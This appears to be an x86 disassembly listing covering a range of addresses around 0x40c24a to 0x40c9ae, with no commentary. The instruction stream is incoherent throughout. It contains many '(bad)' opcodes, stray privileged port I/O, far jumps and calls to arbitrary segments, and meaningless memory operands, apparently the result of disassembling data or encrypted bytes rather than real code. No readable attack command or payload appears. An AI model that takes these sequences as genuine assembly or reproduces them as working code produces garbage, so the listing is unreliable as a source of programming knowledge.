  40c24a:	adc    BYTE PTR [esp+esi*8+0x78],al
  40c24e:	retf   
  40c24f:	loop   0x40c2b2
  40c251:	jmp    0x23ca27d1
  40c256:	fstp   TBYTE PTR [ecx+0x1fbcd181]
  40c25c:	pop    es
  40c25d:	stos   DWORD PTR es:[edi],eax
  40c25e:	and    edx,DWORD PTR [eax-0x45f4f015]
  40c264:	and    al,0xf8
  40c266:	add    edi,esp
  40c268:	in     al,0xf9
  40c26a:	jecxz  0x40c2aa
  40c26c:	retf   
  40c26d:	fisttp WORD PTR [eax+ecx*4-0x4f]
  40c271:	mov    bl,0xc9
  40c273:	adc    al,0x21
  40c275:	lods   al,BYTE PTR ds:[esi]
  40c276:	loopne 0x40c2a3
  40c278:	dec    esi
  40c279:	(bad)  
  40c27b:	adc    DWORD PTR [esi-0x23032b43],esp
  40c281:	fcomip st,st(1)
  40c283:	ja     0x40c278
  40c285:	outs   dx,BYTE PTR ds:[esi]
  40c286:	xchg   DWORD PTR [edi+0x4afcd632],ecx
  40c28c:	jno    0x40c2fe
  40c28e:	mov    ds:0x2bde3fd2,al
  40c293:	iret   
  40c294:	cmp    DWORD PTR [esp+ecx*8],esp
  40c297:	mov    al,0x8b
  40c299:	inc    ecx
  40c29a:	sub    DWORD PTR [edi],0xffffffb4
  40c29d:	jb     0x40c24e
  40c29f:	arpl   WORD PTR [ebx+0x11],bx
  40c2a2:	jecxz  0x40c31d
  40c2a4:	push   ebx
  40c2a5:	mov    ebx,DWORD PTR ds:0xb70efb49
  40c2ab:	push   esp
  40c2ac:	lahf   
  40c2ad:	mov    al,0xbc
  40c2af:	jmp    DWORD PTR [eax-0x1cd40f28]
  40c2b5:	outs   dx,BYTE PTR ds:[esi]
  40c2b6:	add    al,0x13
  40c2b8:	popa   
  40c2b9:	mov    esi,0x1336b67c
  40c2be:	mov    ecx,0x4d76c53f
  40c2c3:	sub    ah,ch
  40c2c5:	(bad)  
  40c2c6:	cmp    BYTE PTR [edx],ch
  40c2c8:	sar    BYTE PTR [ecx+ecx*8+0x2e],cl
  40c2cc:	sbb    bh,0x48
  40c2cf:	cmp    dh,dl
  40c2d1:	adc    al,0x39
  40c2d3:	mov    al,ds:0x98014757
  40c2d8:	faddp  st(4),st
  40c2da:	mov    esp,0x7519d1e8
  40c2df:	jmp    DWORD PTR [edi-0x21]
  40c2e2:	out    dx,al
  40c2e3:	push   0xbfa9cd95
  40c2e8:	inc    ebx
  40c2e9:	adc    DWORD PTR [ecx-0x29f41478],edx
  40c2ef:	push   edi
  40c2f0:	sar    BYTE PTR [esi-0x20c449d3],1
  40c2f6:	outs   dx,BYTE PTR ds:[esi]
  40c2f7:	je     0x40c30e
  40c2f9:	push   es
  40c2fa:	outs   dx,BYTE PTR ds:[esi]
  40c2fb:	(bad)  
  40c2fc:	in     eax,dx
  40c2fd:	cmp    al,0xe3
  40c2ff:	sub    bh,al
  40c301:	fild   WORD PTR [ecx]
  40c303:	mov    ah,0xf8
  40c305:	push   ebp
  40c306:	jmp    0x4ecd:0x5fdfc847
  40c30d:	xchg   edi,eax
  40c30e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c30f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c310:	add    edi,DWORD PTR [ebp-0x21c27f04]
  40c316:	mov    eax,ds:0x65acbc57
  40c31b:	enter  0xcd12,0x6e
  40c31f:	es inc edx
  40c321:	adc    esi,DWORD PTR [edx]
  40c323:	and    ebp,ebx
  40c325:	dec    esp
  40c326:	out    0xca,eax
  40c328:	test   al,0x1a
  40c32a:	dec    ebx
  40c32b:	sub    ebx,edi
  40c32d:	fcomip st,st(4)
  40c32f:	cmc    
  40c330:	inc    edi
  40c331:	and    edx,0x44b99fcb
  40c337:	sar    DWORD PTR [esi-0x45e6c721],cl
  40c33d:	(bad)  
  40c33e:	xchg   ecx,eax
  40c33f:	add    esp,DWORD PTR [eax+0x6d0b1907]
  40c345:	xchg   ecx,eax
  40c346:	push   esp
  40c347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c348:	jmp    0x40c3ba
  40c34a:	push   ebp
  40c34b:	sub    al,BYTE PTR [ecx-0x7cec52ce]
  40c351:	mov    bh,0x1
  40c353:	add    ebp,DWORD PTR ds:0xedcfd04
  40c359:	and    eax,0xdf2c5c0c
  40c35e:	sub    eax,DWORD PTR [ebx-0x4df6d139]
  40c364:	add    bl,BYTE PTR [edx+0x2b]
  40c367:	jae    0x40c354
  40c369:	fs mov ecx,0x1a7345b1
  40c36f:	mov    eax,ds:0x5abdfb6
  40c374:	mov    ecx,ecx
  40c376:	push   eax
  40c377:	(bad)  
  40c378:	push   esi
  40c379:	sar    esp,cl
  40c37b:	(bad)  
  40c37c:	and    eax,0x79b6facc
  40c381:	mov    WORD PTR [edx],es
  40c383:	enter  0xe359,0xa9
  40c387:	hlt    
  40c388:	lods   al,BYTE PTR ds:[esi]
  40c389:	or     dh,BYTE PTR [ecx]
  40c38b:	daa    
  40c38c:	jmp    0x40c380
  40c38e:	popf   
  40c38f:	es pop ebp
  40c391:	adc    BYTE PTR [eax],0x7a
  40c394:	and    eax,0xc552d7e8
  40c399:	retf   
  40c39a:	test   al,0xca
  40c39c:	pusha  
  40c39d:	xor    bh,BYTE PTR [ebp+0x1d02f79d]
  40c3a3:	test   al,0x9d
  40c3a5:	pop    ebx
  40c3a6:	add    DWORD PTR [ebp+ecx*1+0x6474bcb5],eax
  40c3ad:	mov    ebx,0x676b28a4
  40c3b2:	aad    0xc7
  40c3b4:	sub    al,0x15
  40c3b6:	aam    0xd9
  40c3b8:	mov    ch,0x8a
  40c3ba:	loope  0x40c3a9
  40c3bc:	(bad)  
  40c3bd:	ficomp DWORD PTR ds:0xac3e27d6
  40c3c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3c4:	sub    ecx,DWORD PTR [edx-0x1d]
  40c3c7:	loop   0x40c444
  40c3c9:	fdivr  QWORD PTR [ebx-0x9f9ce77]
  40c3cf:	adc    al,0x53
  40c3d1:	in     al,dx
  40c3d2:	test   eax,esi
  40c3d4:	jmp    0x40c438
  40c3d6:	add    DWORD PTR [esi],esi
  40c3d8:	into   
  40c3d9:	aas    
  40c3da:	pop    ds
  40c3db:	jle    0x40c3fc
  40c3dd:	fnstenv [ebp+0x12]
  40c3e0:	inc    edx
  40c3e1:	sar    BYTE PTR [ecx+ebx*4],cl
  40c3e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3e5:	sub    ch,BYTE PTR [ecx-0x7a]
  40c3e8:	jmp    0xedf58425
  40c3ed:	jg     0x40c3a9
  40c3ef:	test   al,0x29
  40c3f1:	mov    bh,0xfb
  40c3f3:	mov    eax,ds:0xf52ddfa4
  40c3f8:	nop
  40c3f9:	xlat   BYTE PTR ds:[ebx]
  40c3fa:	dec    edx
  40c3fb:	loope  0x40c398
  40c3fd:	mov    bl,0x28
  40c3ff:	push   ds
  40c400:	jmp    0x40c39a
  40c402:	or     DWORD PTR [ecx+0x58c5c48c],edi
  40c408:	cli    
  40c409:	jmp    0xf00c:0xdf0bca94
  40c410:	xchg   esp,eax
  40c411:	sbb    bh,BYTE PTR [eax-0x3690149f]
  40c417:	mov    ecx,0x5d24dc05
  40c41c:	mov    ch,ah
  40c41e:	mov    dh,0x4c
  40c420:	popf   
  40c421:	fistp  WORD PTR [ebx+0x377389e9]
  40c427:	gs jmp 0x904a:0x59a938ab
  40c42f:	sbb    ch,dl
  40c431:	sbb    cl,bl
  40c433:	adc    al,0x60
  40c435:	fild   WORD PTR [eax]
  40c437:	stos   DWORD PTR es:[edi],eax
  40c438:	(bad)  
  40c439:	xor    bl,dl
  40c43b:	push   ebp
  40c43c:	xor    al,0xe8
  40c43e:	fs mov ebx,ebp
  40c441:	std    
  40c442:	sub    eax,0xa45ae900
  40c447:	fcomi  st,st(7)
  40c449:	fild   QWORD PTR [ebx+ebx*2+0x44d0651]
  40c450:	retf   
  40c451:	push   eax
  40c452:	add    al,0xbb
  40c454:	mov    WORD PTR [ebp-0x43],fs
  40c457:	fisttp QWORD PTR [edx-0x59b003a0]
  40c45d:	or     DWORD PTR [ecx*4+0x3f17886b],ecx
  40c464:	inc    ebx
  40c465:	ins    BYTE PTR es:[edi],dx
  40c466:	push   ds
  40c467:	das    
  40c468:	jmp    0x1832:0x60f1ad7
  40c46f:	inc    eax
  40c470:	shl    DWORD PTR [ebx+0x56],cl
  40c473:	retf   
  40c474:	into   
  40c475:	imul   ebp,ebp,0x6c45ccb6
  40c47b:	cmp    BYTE PTR [ebp+0xd],ah
  40c47e:	icebp  
  40c47f:	call   0x8f89:0x5acef1eb
  40c486:	in     al,0xd5
  40c488:	aaa    
  40c489:	add    al,0xc2
  40c48b:	mov    ebp,0x3750c066
  40c490:	les    edi,FWORD PTR [edi-0x2e0a8eaf]
  40c496:	cld    
  40c497:	cwde   
  40c498:	mov    ds:0x36db8291,eax
  40c49d:	push   esi
  40c49e:	sti    
  40c49f:	(bad)  
  40c4a0:	retf   
  40c4a1:	aam    0x4a
  40c4a3:	(bad)  
  40c4a4:	not    BYTE PTR [eax]
  40c4a6:	cmp    DWORD PTR [ebp-0x15],esi
  40c4a9:	inc    ebp
  40c4aa:	pop    edi
  40c4ab:	pop    edx
  40c4ac:	mov    al,0x71
  40c4ae:	push   cs
  40c4af:	iret   
  40c4b0:	test   DWORD PTR [eax],ecx
  40c4b2:	adc    ebp,eax
  40c4b4:	in     al,dx
  40c4b5:	xor    BYTE PTR [eax],bl
  40c4b7:	cs out dx,eax
  40c4b9:	pop    ebp
  40c4ba:	xor    esp,esi
  40c4bc:	popa   
  40c4bd:	pop    ds
  40c4be:	out    0xd1,eax
  40c4c0:	imul   ebx,edi,0xfffffff2
  40c4c3:	mov    esp,0xfd31e55c
  40c4c8:	(bad)  
  40c4c9:	fcom   QWORD PTR [esi-0x59bf328a]
  40c4cf:	xor    DWORD PTR [ebx],ebp
  40c4d1:	ins    DWORD PTR es:[edi],dx
  40c4d2:	test   al,0xa5
  40c4d4:	jmp    0x40c4a7
  40c4d6:	out    0xb3,eax
  40c4d8:	dec    esp
  40c4d9:	lods   eax,DWORD PTR ds:[esi]
  40c4da:	fild   QWORD PTR [edi+0x60]
  40c4dd:	fbstp  TBYTE PTR [edx-0x62192685]
  40c4e3:	outs   dx,DWORD PTR ds:[esi]
  40c4e4:	ficom  DWORD PTR [eax-0x3]
  40c4e7:	es in  al,0x4b
  40c4ea:	xor    BYTE PTR [esi+ecx*1-0x78bf8592],bh
  40c4f1:	jmp    0x40c479
  40c4f3:	inc    esi
  40c4f4:	jnp    0x40c515
  40c4f6:	leave  
  40c4f7:	dec    ebx
  40c4f8:	inc    ebp
  40c4f9:	retf   
  40c4fa:	push   ebp
  40c4fb:	stos   DWORD PTR es:[edi],eax
  40c4fc:	in     al,dx
  40c4fd:	dec    edx
  40c4fe:	xchg   esp,eax
  40c4ff:	push   eax
  40c500:	mov    WORD PTR [ebp+0x471b410a],fs
  40c506:	jmp    0x3140e3c6
  40c50b:	add    eax,0x48c2a4bc
  40c510:	out    0x6e,al
  40c512:	push   ds
  40c513:	sub    ebx,0xbd3e399e
  40c519:	pop    edi
  40c51a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c51b:	jp     0x40c52b
  40c51d:	or     dh,dh
  40c51f:	cmp    al,0xeb
  40c521:	mov    bh,0xbb
  40c523:	add    ch,bh
  40c525:	enter  0x8a66,0xeb
  40c529:	push   ss
  40c52a:	add    dl,BYTE PTR [esi+0x6e]
  40c52d:	fsub   DWORD PTR [ecx-0x6d1f154e]
  40c533:	repnz pop ebx
  40c535:	stc    
  40c536:	ret    0xe88
  40c539:	sub    bl,bl
  40c53b:	sub    ebx,0x72
  40c53e:	sub    eax,0xc158a620
  40c543:	cmc    
  40c544:	add    ebx,ecx
  40c546:	pop    eax
  40c547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c548:	xlat   BYTE PTR ds:[ebx]
  40c549:	pop    ebx
  40c54a:	mov    eax,ds:0x5b0d5948
  40c54f:	or     BYTE PTR [eax],dl
  40c551:	aas    
  40c552:	std    
  40c553:	ja     0x40c4fd
  40c555:	stos   BYTE PTR es:[edi],al
  40c556:	xor    eax,0xfe823170
  40c55b:	into   
  40c55c:	sbb    DWORD PTR [ecx-0x24],ebp
  40c55f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c560:	imul   esi,DWORD PTR [esi+0x7b],0xffffff9f
  40c564:	lds    esi,FWORD PTR [esi+0x3ab3e4fc]
  40c56a:	inc    esi
  40c56b:	pop    esp
  40c56c:	pusha  
  40c56d:	xor    DWORD PTR [edx],edx
  40c56f:	enter  0x28b9,0xce
  40c573:	xor    BYTE PTR [edi-0x14edecd3],0xc2
  40c57a:	inc    esp
  40c57b:	mov    ch,0x49
  40c57d:	jb     0x40c5f2
  40c57f:	pop    edx
  40c580:	cmp    dh,bl
  40c582:	fnstsw WORD PTR [edi*8-0x64e80ac5]
  40c589:	daa    
  40c58a:	mov    dl,0x21
  40c58c:	mov    eax,ds:0x108afd69
  40c591:	add    DWORD PTR [ebp+0x62a6d4cb],0xffffffc8
  40c598:	cmc    
  40c599:	pop    edx
  40c59a:	cmp    dl,dh
  40c59c:	pop    es
  40c59d:	and    al,0x27
  40c59f:	inc    esp
  40c5a0:	and    edi,eax
  40c5a2:	cld    
  40c5a3:	sub    eax,0xc582f4d
  40c5a8:	(bad)  
  40c5a9:	push   0xfffffff5
  40c5ab:	mov    ebp,0x48bb8c0c
  40c5b0:	mov    ah,ch
  40c5b2:	daa    
  40c5b3:	out    0x46,al
  40c5b5:	out    0xfc,eax
  40c5b7:	in     al,dx
  40c5b8:	push   edi
  40c5b9:	ins    BYTE PTR es:[edi],dx
  40c5ba:	sub    eax,0xe35a1242
  40c5bf:	sub    edx,DWORD PTR [edi+ebx*8-0x33]
  40c5c3:	nop
  40c5c4:	lea    eax,[edx+0xf4a13f7]
  40c5ca:	scas   eax,DWORD PTR es:[edi]
  40c5cb:	jp     0x40c5b8
  40c5cd:	mov    ebp,0xee978ac5
  40c5d2:	aas    
  40c5d3:	sub    ebx,DWORD PTR [ecx+0x801e3df]
  40c5d9:	scas   eax,DWORD PTR es:[edi]
  40c5da:	jne    0x40c590
  40c5dc:	mov    eax,ds:0x6448fcc2
  40c5e1:	or     ebp,0xbb8b280d
  40c5e7:	enter  0xd5ed,0x34
  40c5eb:	mov    edx,0xb044c044
  40c5f0:	mov    bl,0x44
  40c5f2:	call   0xc748:0xeb6a3ec8
  40c5f9:	dec    ebx
  40c5fa:	out    dx,al
  40c5fb:	mov    ecx,0xc5da0282
  40c601:	lods   eax,DWORD PTR ds:[esi]
  40c602:	mov    ah,0x2d
  40c604:	in     al,dx
  40c605:	push   edi
  40c606:	or     bh,0x39
  40c609:	mov    bl,0xba
  40c60b:	jbe    0x40c614
  40c60d:	bound  esi,QWORD PTR [ecx-0x2a434d38]
  40c613:	icebp  
  40c614:	add    DWORD PTR [ebp-0x4d3a50c5],esi
  40c61a:	adc    BYTE PTR [ebx-0x15],dh
  40c61d:	push   edx
  40c61e:	pop    ebx
  40c61f:	cmp    edx,eax
  40c621:	sbb    al,0x46
  40c623:	retf   
  40c624:	xor    al,0xe4
  40c626:	inc    ebx
  40c627:	and    BYTE PTR [ebx],ch
  40c629:	adc    BYTE PTR [esi-0x27],dl
  40c62c:	xor    eax,0xebf12c17
  40c631:	push   ds
  40c632:	jp     0x40c612
  40c634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c635:	mov    ah,0xd0
  40c637:	and    DWORD PTR [esi-0x21],ebp
  40c63a:	loopne 0x40c687
  40c63c:	cmp    ch,bh
  40c63e:	xchg   edx,eax
  40c63f:	std    
  40c640:	stc    
  40c641:	add    al,0xfd
  40c643:	cmp    eax,0x3a1624dc
  40c648:	sbb    DWORD PTR [eax+0x78abc7b2],edi
  40c64e:	jns    0x40c650
  40c650:	dec    esp
  40c651:	jg     0x40c683
  40c653:	xor    al,0x9c
  40c655:	(bad)  
  40c656:	std    
  40c657:	(bad)  
  40c658:	in     al,0xd7
  40c65a:	scas   eax,DWORD PTR es:[edi]
  40c65b:	inc    edi
  40c65c:	out    dx,al
  40c65d:	adc    esp,DWORD PTR [edi-0x4da71d38]
  40c663:	push   es
  40c664:	push   eax
  40c665:	push   edi
  40c666:	sub    eax,0x8b5affd8
  40c66b:	push   cs
  40c66c:	jmp    0x40c6e2
  40c66e:	lods   eax,DWORD PTR ds:[esi]
  40c66f:	sahf   
  40c670:	xchg   ebx,eax
  40c671:	pop    ds
  40c672:	jp     0x40c643
  40c674:	inc    esp
  40c675:	pop    es
  40c676:	mov    ebx,0xef044b38
  40c67b:	and    DWORD PTR [edx-0x6e3a0346],edi
  40c681:	ret    
  40c682:	add    eax,0x9d953208
  40c687:	enter  0xb9cc,0x0
  40c68b:	retf   0x70be
  40c68e:	and    ebp,DWORD PTR [ecx-0x15]
  40c691:	(bad)  
  40c692:	stos   DWORD PTR es:[edi],eax
  40c693:	and    BYTE PTR [edx+0x17],dh
  40c696:	add    ah,BYTE PTR [ecx+0x2413d9d1]
  40c69c:	cmp    eax,0xe269ce5
  40c6a1:	xchg   ecx,eax
  40c6a2:	push   cs
  40c6a3:	mov    ebx,0xfffd707b
  40c6a8:	mov    BYTE PTR [ebx-0x4ecc9a36],0x29
  40c6af:	enter  0xf592,0xd2
  40c6b3:	sbb    eax,0x1841b32
  40c6b8:	call   0x89c5:0x7056fd79
  40c6bf:	adc    DWORD PTR [ebp-0x3137bfdd],ebp
  40c6c5:	in     al,dx
  40c6c6:	sub    ebx,DWORD PTR ss:[esi+ebx*1]
  40c6ca:	mov    ch,0xf0
  40c6cc:	call   0xfe58:0x84880b48
  40c6d3:	adc    eax,0x212c3740
  40c6d8:	and    eax,DWORD PTR [edi+0x45]
  40c6db:	mov    esi,0x83c2976
  40c6e0:	loopne 0x40c73e
  40c6e2:	mov    al,ds:0x241f8f9
  40c6e7:	push   0xffffffce
  40c6e9:	mov    dh,0xbc
  40c6eb:	xchg   edx,eax
  40c6ec:	shr    DWORD PTR [edi+0x1d],0x90
  40c6f0:	mov    eax,ds:0x9d97a1df
  40c6f5:	ss retf 0xe35d
  40c6f9:	loope  0x40c6f7
  40c6fb:	cmp    BYTE PTR [ecx],dl
  40c6fd:	inc    ebp
  40c6fe:	call   FWORD PTR [esi-0x40]
  40c701:	dec    eax
  40c702:	imul   edx,DWORD PTR [esi],0x2a
  40c705:	fist   WORD PTR [ebp+eax*8+0xa2ab66]
  40c70c:	fwait
  40c70d:	and    edx,DWORD PTR [ecx-0x6d1f13d1]
  40c713:	inc    ecx
  40c714:	mov    al,bh
  40c716:	push   edx
  40c717:	cmc    
  40c718:	das    
  40c719:	jg     0x40c784
  40c71b:	enter  0x80ae,0xfa
  40c71f:	cmp    dl,BYTE PTR [ebx-0x1418a4b9]
  40c725:	scas   eax,DWORD PTR es:[edi]
  40c726:	ds inc esp
  40c728:	div    ecx
  40c72a:	cs lahf 
  40c72c:	jne    0x40c701
  40c72e:	lds    edi,FWORD PTR [esi+0x8c57eea]
  40c734:	mov    ch,0x4c
  40c736:	arpl   di,sp
  40c738:	ins    DWORD PTR es:[edi],dx
  40c739:	jb     0x40c72e
  40c73b:	mov    ?,WORD PTR [ebx]
  40c73d:	into   
  40c73e:	sub    DWORD PTR [eax],ebp
  40c740:	push   ecx
  40c741:	dec    ebx
  40c742:	into   
  40c743:	xor    bl,BYTE PTR [ebx]
  40c745:	in     eax,dx
  40c746:	sub    bh,bl
  40c748:	(bad)  
  40c749:	fbstp  TBYTE PTR [eax+eax*2]
  40c74c:	stos   BYTE PTR es:[edi],al
  40c74d:	inc    eax
  40c74e:	test   eax,0xe7ffec4b
  40c753:	mov    bh,0x9f
  40c755:	fld    st(6)
  40c757:	js     0x40c6e4
  40c759:	jp     0x40c7bc
  40c75b:	enter  0xad4e,0x50
  40c75f:	sub    BYTE PTR [edi-0x19b74cf1],al
  40c765:	into   
  40c766:	popa   
  40c767:	mov    edi,0xb6cc44c0
  40c76c:	sub    edx,DWORD PTR [ebp-0x73]
  40c76f:	fld    TBYTE PTR [eax+0x7405d0df]
  40c775:	std    
  40c776:	xor    BYTE PTR [ebx+0x23],bl
  40c779:	(bad)  
  40c77a:	cld    
  40c77b:	adc    cl,BYTE PTR [esi-0x6d]
  40c77e:	sbb    esp,DWORD PTR [esi-0x75]
  40c781:	cmp    al,0x1e
  40c783:	mov    dh,0xc4
  40c785:	fbstp  TBYTE PTR [edx]
  40c787:	sbb    edi,esp
  40c789:	ret    
  40c78a:	test   ch,0xdc
  40c78d:	stos   DWORD PTR es:[edi],eax
  40c78e:	cwde   
  40c78f:	leave  
  40c790:	or     DWORD PTR [esi+0x2c],ebx
  40c793:	out    dx,al
  40c794:	jmp    0x40c72e
  40c796:	adc    edx,ebp
  40c798:	cmp    dl,bl
  40c79a:	push   ebx
  40c79b:	pushf  
  40c79c:	(bad)  
  40c79d:	fdiv   QWORD PTR [esi]
  40c79f:	xchg   edi,eax
  40c7a0:	fcomp  DWORD PTR [esi]
  40c7a2:	xor    DWORD PTR [ebx+0x54],0x25c7d917
  40c7a9:	lock push ss
  40c7ab:	leave  
  40c7ac:	loope  0x40c7cb
  40c7ae:	cmp    al,0x2a
  40c7b0:	fiadd  WORD PTR [esp+ebp*2-0x32604f0]
  40c7b7:	jmp    0x474796f9
  40c7bc:	scas   al,BYTE PTR es:[edi]
  40c7bd:	jno    0x40c740
  40c7bf:	pop    eax
  40c7c0:	lods   al,BYTE PTR ds:[esi]
  40c7c1:	lds    esi,FWORD PTR [edx]
  40c7c3:	sub    BYTE PTR [edi-0x23696922],ch
  40c7c9:	bound  esp,QWORD PTR [ebx+0x2a]
  40c7cc:	inc    ebp
  40c7cd:	sub    eax,DWORD PTR [ebp+0x55]
  40c7d0:	out    dx,al
  40c7d1:	cmp    cl,BYTE PTR [esi+ecx*2+0x47bd0af2]
  40c7d8:	mov    cl,0x49
  40c7da:	cmp    BYTE PTR [edx+0xcbed4e0],dh
  40c7e0:	mov    edx,0x754c7b91
  40c7e5:	push   edi
  40c7e6:	std    
  40c7e7:	outs   dx,BYTE PTR ds:[esi]
  40c7e8:	cs pop ss
  40c7ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7eb:	sub    DWORD PTR [ebx-0x5437aeb0],edi
  40c7f1:	in     eax,dx
  40c7f2:	sub    eax,0xd4cd7e63
  40c7f7:	or     DWORD PTR [ebx+0x76],edi
  40c7fa:	hlt    
  40c7fb:	dec    esp
  40c7fc:	imul   ebx,DWORD PTR [eax-0x4431d564],0x65098828
  40c806:	sbb    al,cl
  40c808:	dec    edx
  40c809:	enter  0xeb9f,0x72
  40c80d:	bound  ebx,QWORD PTR [esi+0x30]
  40c810:	jmp    0x40c818
  40c812:	fcomp  DWORD PTR [edx+0x210dc0ea]
  40c818:	mov    ebx,0x1c9e33de
  40c81d:	jbe    0x40c7b3
  40c81f:	mul    BYTE PTR [edx-0x140bfff1]
  40c825:	pop    edi
  40c826:	call   0xef51:0xf0809338
  40c82d:	addr16 push es
  40c82f:	enter  0xc1c8,0x2d
  40c833:	nop
  40c834:	int    0x9
  40c836:	mov    ds:0xd94e292,al
  40c83b:	dec    eax
  40c83c:	sbb    esp,DWORD PTR [edi]
  40c83e:	push   ebp
  40c83f:	adc    esi,DWORD PTR [edi-0x29]
  40c842:	test   bh,0x55
  40c845:	(bad)  
  40c846:	ret    0xdf22
  40c849:	loopne 0x40c7f0
  40c84b:	paddw  mm0,QWORD PTR [esi]
  40c84e:	xchg   ebx,eax
  40c84f:	(bad)  
  40c850:	sub    ebx,DWORD PTR ds:0x72852734
  40c856:	jmp    0x3d6c4722
  40c85b:	xlat   BYTE PTR ds:[ebx]
  40c85c:	rol    BYTE PTR [edx+eax*4],cl
  40c85f:	adc    ebx,ebp
  40c861:	xchg   esi,eax
  40c862:	in     eax,dx
  40c863:	icebp  
  40c864:	mov    esp,DWORD PTR [esi]
  40c866:	xor    al,0x8a
  40c868:	jb     0x40c849
  40c86a:	sahf   
  40c86b:	daa    
  40c86c:	ins    DWORD PTR es:[edi],dx
  40c86d:	imul   DWORD PTR [ebp-0x326cd65]
  40c873:	mov    ah,0xa1
  40c875:	mov    edx,0xa218c014
  40c87a:	push   ebp
  40c87b:	enter  0xcb95,0x40
  40c87f:	dec    DWORD PTR [esi]
  40c881:	ds mov dh,0x2
  40c884:	jmp    0x40c8b6
  40c886:	aas    
  40c887:	mov    BYTE PTR [eax],al
  40c889:	sub    ebp,DWORD PTR [edx-0x1420075d]
  40c88f:	sbb    BYTE PTR [edi],bh
  40c891:	mov    bh,0x91
  40c893:	inc    ebp
  40c894:	push   cs
  40c895:	dec    eax
  40c896:	std    
  40c897:	stc    
  40c898:	imul   edi,DWORD PTR [edi+0x1bc430c],0x96588082
  40c8a2:	cld    
  40c8a3:	xchg   ebx,eax
  40c8a4:	mov    ch,0x60
  40c8a6:	dec    ecx
  40c8a7:	inc    ebp
  40c8a8:	mov    ecx,0x52afd09
  40c8ad:	sbb    BYTE PTR [edx+ebp*4],0x3a
  40c8b1:	adc    eax,0x5ddbbd1b
  40c8b6:	aam    0x47
  40c8b8:	arpl   WORD PTR [edx-0x2],si
  40c8bb:	into   
  40c8bc:	dec    edx
  40c8bd:	loopne 0x40c8bb
  40c8bf:	imul   ecx,DWORD PTR [ebp-0x4bd5a7a6],0xffffff9d
  40c8c6:	and    cl,cl
  40c8c8:	(bad)  
  40c8c9:	mov    dh,0xba
  40c8cb:	xchg   ebx,eax
  40c8cc:	loope  0x40c8be
  40c8ce:	in     al,0x17
  40c8d0:	mov    cl,0x41
  40c8d2:	dec    BYTE PTR [edi+0x6fb403c5]
  40c8d8:	inc    ebp
  40c8d9:	dec    ecx
  40c8da:	sub    eax,0x6cdfe811
  40c8df:	xor    al,0xdd
  40c8e1:	int    0x4b
  40c8e3:	push   esp
  40c8e4:	adc    al,0x7e
  40c8e6:	dec    BYTE PTR [edi+0x36be0166]
  40c8ec:	jns    0x40c8bf
  40c8ee:	cwde   
  40c8ef:	mov    esp,DWORD PTR [ebp+0x8]
  40c8f2:	pop    edi
  40c8f3:	adc    al,0x6b
  40c8f5:	xor    edx,DWORD PTR [esi]
  40c8f7:	adc    cl,BYTE PTR [esi-0x80]
  40c8fa:	mov    gs,WORD PTR [ebp-0x18]
  40c8fd:	add    al,0x49
  40c8ff:	mov    WORD PTR [ebx],ds
  40c901:	stos   BYTE PTR es:[edi],al
  40c902:	cld    
  40c903:	push   edi
  40c904:	ins    DWORD PTR es:[edi],dx
  40c905:	shl    BYTE PTR [eax-0x6e1722c0],cl
  40c90b:	adc    BYTE PTR [ebp-0x5dcd0d61],bh
  40c911:	sbb    ch,BYTE PTR [esi]
  40c913:	das    
  40c914:	jmp    0x40c8b4
  40c916:	(bad)  
  40c917:	imul   esp,DWORD PTR [esi+0xd],0xdffc8732
  40c91e:	aaa    
  40c91f:	out    0x9b,al
  40c921:	mov    eax,0xd16875cd
  40c926:	cld    
  40c927:	jns    0x40c91e
  40c929:	cmp    al,dh
  40c92b:	pop    es
  40c92c:	xor    al,0x79
  40c92e:	push   esi
  40c92f:	mov    esi,0x47ea9ec6
  40c934:	mov    esp,ss
  40c936:	dec    ecx
  40c937:	out    dx,al
  40c938:	and    al,dh
  40c93a:	cld    
  40c93b:	xor    al,0x23
  40c93d:	xor    BYTE PTR [eax+0x7],bl
  40c940:	das    
  40c941:	into   
  40c942:	sub    BYTE PTR [ecx+0x4eaede0e],bl
  40c948:	jecxz  0x40c966
  40c94a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c94b:	ins    DWORD PTR es:[edi],dx
  40c94c:	(bad)  
  40c94d:	dec    ebx
  40c94e:	jno    0x40c99d
  40c950:	jmp    0x40c9bf
  40c952:	pusha  
  40c953:	ret    
  40c954:	mov    bh,0xa9
  40c956:	call   DWORD PTR [ebx]
  40c958:	(bad)  
  40c95a:	aas    
  40c95b:	and    DWORD PTR [ecx-0x3c],0xffffff98
  40c95f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c960:	push   cs
  40c961:	cld    
  40c962:	cld    
  40c963:	xchg   ecx,eax
  40c964:	cdq    
  40c965:	or     DWORD PTR [edi-0x59],ebx
  40c968:	fistp  WORD PTR [ebx+esi*8]
  40c96b:	loopne 0x40c8ed
  40c96d:	push   ebp
  40c96e:	jge    0x40c900
  40c970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c971:	repnz add ecx,0xffffff8f
  40c975:	sahf   
  40c976:	pop    ebp
  40c977:	and    esp,esi
  40c979:	and    esp,DWORD PTR [ecx-0x235dc87]
  40c97f:	dec    ecx
  40c980:	pop    edx
  40c981:	lock inc eax
  40c983:	daa    
  40c984:	in     al,dx
  40c985:	cmp    ch,ch
  40c987:	jp     0x40c9a3
  40c989:	jmp    0xdf4b8b82
  40c98e:	mov    ebp,0xb88d8d81
  40c993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c994:	out    0x4b,al
  40c996:	sbb    eax,0xa0457226
  40c99b:	add    ch,dh
  40c99d:	xchg   DWORD PTR [edx+0x54],esp
  40c9a0:	inc    edx
  40c9a1:	jecxz  0x40ca0c
  40c9a3:	inc    ebp
  40c9a4:	adc    bl,ah
  40c9a6:	jne    0x40c9b0
  40c9a8:	pop    edi
  40c9a9:	sbb    BYTE PTR [ecx-0x32],dh
  40c9ac:	jmp    0x40c9b2
  40c9ae:	(bad)  
